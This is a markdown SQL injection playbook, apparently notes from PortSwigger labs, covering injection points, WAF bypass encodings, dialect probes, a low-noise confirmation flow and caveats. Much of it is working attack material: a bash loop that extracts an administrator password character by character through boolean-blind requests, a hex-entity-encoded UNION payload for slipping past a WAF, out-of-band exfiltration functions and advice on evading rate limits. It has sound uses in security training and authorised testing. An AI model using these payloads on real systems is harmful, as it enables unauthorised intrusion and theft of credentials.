# SQL injection — playbook

## when to try
- Any string param flowing into a backend that returns differential responses
  (200/302 vs 500/4xx, or visibly different body length) when a quote is appended.
- Numeric params that change behaviour with `1+1` arithmetic vs `1`.
- XML/JSON body fields, HTTP headers (User-Agent, Referer, X-Forwarded-For),
  cookies — anywhere a value is concatenated into a query.
- ORMs sometimes still expose raw fragments via `orderBy`, `groupBy`,
  `where(`raw)`, search filters, or "advanced query" features.

## key bypass tricks
- **Quote shape**: `'`, `"`, `` ` ``, no quote (numeric ctx).
- **Comment terminators**: `--%20`, `-- -`, `#`, `/*…*/`. Postgres needs the trailing space after `--`.
- **WAF on keywords**: try
  - case-mix `UnIoN sElEcT`
  - inline comments `UN/**/ION/**/SELECT`
  - whitespace alternatives `%09 %0a %0c %0d %a0`
  - XML hex-entity encoding (see `xml-entity-waf-bypass.md`)
  - URL-encode twice if WAF is in front of a decoder
- **Column count**: `ORDER BY n` walking up; or `UNION SELECT NULL,NULL,…` until accepted.
- **Dialect detection** (one-shot probes):
  - PostgreSQL: `SELECT version()`, `||` for concat, `pg_sleep(3)`
  - MySQL/MariaDB: `@@version`, `CONCAT()`, `SLEEP(3)`, `BENCHMARK`
  - MS-SQL: `@@VERSION`, `+` for concat, `WAITFOR DELAY '0:0:3'`
  - Oracle: `FROM dual`, `BANNER FROM v$version`
  - SQLite: `sqlite_version()`, no system tables
- **Blind paths**: boolean-blind via length/status diff; time-blind via dialect-specific sleep; out-of-band via DNS/HTTP exfil (`xp_dirtree` MSSQL, `LOAD_FILE` MySQL, `dblink_connect` PG, `UTL_HTTP` Oracle).

## confirmation flow (low-noise)
1. Capture **baseline** for the param.
2. Send `'` (or `1'1`/`1"1` for numeric). Diff status + body length.
3. Send `' AND 1=1-- ` and `' AND 1=2-- `. Same vs different → boolean confirmed.
4. (Optional) `'+pg_sleep(3)-- ` etc. for time-confirmation.
5. STOP and write a finding the moment 3 + 4 are both clean — do not auto-extract on real targets without permission.

## exploitation snippets
Boolean-blind char extraction (PG):
```bash
for i in $(seq 1 25); do
  for c in {a..z} {0..9}; do
    body="1' AND substr((SELECT password FROM users WHERE username='administrator'),$i,1)='$c'-- "
    enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$body")
    diff=$(curl -sk -o /dev/null -w '%{size_download}\n' "https://t/x?id=$enc")
    [ "$diff" = "324" ] && echo "pos $i = $c" && break
  done
done
```

UNION extract once column count is known (1 col):
```bash
python3 -c "print(''.join(f'&#x{ord(c):x};' for c in \"1 UNION SELECT username||':'||password FROM users-- \"))"
# → drop into XML body for entity-encoded WAF bypass
```

## caveats
- Differential responses on 200 status may still mean false positive (caching, load-balancer randomness, A/B). Repeat each probe 3× and confirm stable diff.
- Heavy WAFs (Cloudflare, Akamai) silently 429 after a few "bad" requests — backoff and rotate UA.
- On real targets do NOT dump tables. Confirm + write the report; let the program triagers verify.

## provenance
- PortSwigger SQLi labs (UNION, blind, second-order, filter-bypass family).
- See sibling: `xml-entity-waf-bypass.md` for the lab solved 2026-04-26.
